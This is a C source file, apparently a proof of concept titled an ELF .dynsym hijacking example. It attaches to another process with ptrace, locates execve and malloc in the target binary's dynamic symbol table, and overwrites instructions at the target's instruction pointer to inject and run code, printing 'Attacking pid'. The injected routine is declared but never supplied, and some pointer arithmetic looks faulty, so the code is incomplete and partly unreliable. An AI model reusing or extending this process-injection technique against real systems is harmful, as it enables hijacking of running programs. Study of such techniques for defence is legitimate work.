/* ELF .dynsym hihacking example
 *
 * Roc Vallès Domènech
 */

#include <stdio.h>
#include <sys/ptrace.h>

#define STACKEXECVEPATCH        0xbffffffa
#define MAXPATHSIZE             256
#define PREPAREINJECTSIZE	16
#define INJECTSIZE		256

void prepareinjectcode();

typedef struct {
	unsigned char       	e_ident[16]; 
	unsigned short int	e_type;
	unsigned short int	e_machine;
	unsigned int		e_version;
	unsigned int		e_entry;
	unsigned int		e_phoff;
	unsigned int		e_shoff;
	unsigned int		e_flags;
	unsigned short int	e_ehsize;
	unsigned short int	e_phentsize;
	unsigned short int	e_phnum;
	unsigned short int	e_shentsize;
	unsigned short int	e_shnum;
	unsigned short int	e_shstrndx;
} Elf32_Ehdr;


typedef struct {
	unsigned int	sh_name;
	unsigned int	sh_type;
	unsigned int	sh_flags;
	unsigned int	sh_addr;
	unsigned int	sh_offset;
	unsigned int	sh_size;
	unsigned int	sh_link;
	unsigned int	sh_info;
	unsigned int	sh_addralign;
	unsigned int	sh_entsize;
} Elf32_Shdr;


typedef struct {
	unsigned int		st_name;
	unsigned int		st_value;
	unsigned int		st_size;
	unsigned char		st_info;
	unsigned char		st_other;
	unsigned short int	st_shndx;
} Elf32_Sym;

struct user_regs_struct {
	long ebx, ecx, edx, esi, edi, ebp, eax;
	unsigned short ds, __ds, es, __es;
	unsigned short fs, __fs, gs, __gs;
	long orig_eax, eip;
	unsigned short cs, __cs;
	long eflags, esp;
	unsigned short ss, __ss;
};


int main(int argc,char *argv[])
{
	int elffd, currprogramheader=0, currsectionheader=0, currsymbyte=0, readed=0, pid, pathread, prepinjectfd, injectcount, *peekpoint;
	unsigned int dt_pltgot, dt_rel, dt_relent, dt_relsz, dt_symtab, dt_syment, execveaddr, mallocaddr, injectaddr, *peekbuf;
	unsigned char *symname;
	unsigned char *path;
	Elf32_Ehdr *elfheader;
	Elf32_Shdr *sectionheader, *strtabheader;
	Elf32_Sym *symheader;
	struct user_regs_struct regs, regsinject;	

	pid = atoi(argv[1]);

	peekbuf = malloc(MAXPATHSIZE);
	ptrace(PTRACE_ATTACH, pid, NULL, NULL);
	for(pathread=0;pathread<MAXPATHSIZE/4;pathread++)
	{
		peekbuf[pathread] = ptrace(PTRACE_PEEKDATA, pid, 0xbfffffff-MAXPATHSIZE+(pathread*4), NULL);
	}
	/*ptrace(PTRACE_DETACH, pid, NULL, NULL);*/
	path=(char *)peekbuf+MAXPATHSIZE;
	while(*path == 0)
		path--;
	while(*path != 0)
		path--;
	path++;

	printf("Attacking pid %d, it's binary seems to be %s\n", pid, path);
	
	elffd = open(path, 0);
	elfheader = malloc(52); /* 52 = sizeof(Elf32_Ehdr) */
	read(elffd, elfheader, 52);
	if(!(elfheader->e_ident[0]==0x7f && elfheader->e_ident[1]=='E' && elfheader->e_ident[2]=='L' && elfheader->e_ident[3]=='F'))
		printf("This is not a ELF!\n");
	if(elfheader->e_machine!=3)
		printf("This ELF isn't for x86 %d\n",elfheader->e_machine);
	lseek(elffd, elfheader->e_shoff, 0); /* SEEK_SET = 0 */
	sectionheader = malloc(elfheader->e_shentsize);
	do
	{
		read(elffd, sectionheader, elfheader->e_shentsize);
		currsectionheader++;
	}
	while(currsectionheader<elfheader->e_shnum && sectionheader->sh_type!=11); /* SHT_DYNSYM = 11 */
	if(sectionheader->sh_type!=11)
		printf("This ELF doesn't have .dynsym. Maybe it's static.\n");
	strtabheader = malloc(elfheader->e_shentsize);
	lseek(elffd, elfheader->e_shoff, 0);
	lseek(elffd, (elfheader->e_shentsize)*(sectionheader->sh_link), 1); /* SEEK_CURR = 1 */
	read(elffd, strtabheader, elfheader->e_shentsize);
	symheader = malloc(16); /* 16 = sizeof(Elf32_Sym); */
	symname = malloc(32); /* 32 por poner algo */
	symname[31] = 0;
	currsymbyte = sectionheader->sh_offset;
	do
	{
		lseek(elffd, currsymbyte, 0);
		read(elffd, symheader, sectionheader->sh_entsize);
		if(symheader->st_name!=0)
		{
			lseek(elffd, strtabheader->sh_offset, 0);	/* That's the string table */
			lseek(elffd, symheader->st_name, 1);	/* SEEK_CUR st_name */
			read(elffd, symname, 31);
			if(symname[0] == 'e' && symname[1] == 'x' && symname[2] == 'e' && symname[3] == 'c' && symname[4] == 'v' && symname[5] == 'e' && symname[6] == '\0')
				execveaddr = symheader->st_value;
			if(symname[0] == 'm' && symname[1] == 'a' && symname[2] == 'l' && symname[3] == 'l' && symname[4] == 'o' && symname[5] == 'c' && symname[6] == '\0')
				mallocaddr = symheader->st_value;
		}
		currsymbyte = currsymbyte+sectionheader->sh_entsize;
	}
	while((sectionheader->sh_size)+(sectionheader->sh_offset)>currsymbyte);
	
	printf("execve() addr: %x\n", execveaddr);
	printf("malloc() addr: %x\n", mallocaddr);
	
	/* Vamos a inyectar algo de codigo. */
	
	ptrace(PTRACE_GETREGS, pid, NULL, &regs);
	ptrace(PTRACE_GETREGS, pid, NULL, &regsinject);
	
	peekbuf = malloc(PREPAREINJECTSIZE);
	
	
	printf("EIP: %x\n", regs.eip);
	
	for (injectcount=0; injectcount<PREPAREINJECTSIZE; injectcount+=4)
	{	
		peekbuf[injectcount]=ptrace(PTRACE_PEEKDATA, pid, regs.eip+injectcount, NULL);
		printf("PEEKED: 0x%.8x at 0x%.8x\n", peekbuf[injectcount],regs.eip+injectcount);
		ptrace(PTRACE_POKEDATA, pid, regs.eip+injectcount, *(int*)(prepareinjectcode+injectcount));
	}
	
	regsinject.eax = INJECTSIZE;
	regsinject.ebx = mallocaddr;
	regsinject.ecx = execveaddr;
	
	ptrace(PTRACE_SETREGS, pid, NULL, &regsinject);
	
	ptrace(PTRACE_CONT, pid, NULL, NULL);
	waitpid(pid, NULL, 0);
	
	ptrace(PTRACE_GETREGS, pid, NULL, &regsinject);
	
	injectaddr = regsinject.eax;

	printf("Malloc result: 0x%.8x\n", injectaddr);
	
	for (injectcount=0; injectcount<PREPAREINJECTSIZE; injectcount+=4)
	{
		ptrace(PTRACE_POKEDATA, pid, regs.eip+injectcount, *(int*)(peekbuf+injectcount));
		printf("POKED: 0x%.8x at 0x%.8x\n", peekbuf[injectcount],regs.eip+injectcount);
	}

	ptrace(PTRACE_SETREGS, pid, NULL, &regs);
	
	ptrace(PTRACE_CONT, pid, NULL, NULL);
	
	return 0;
}
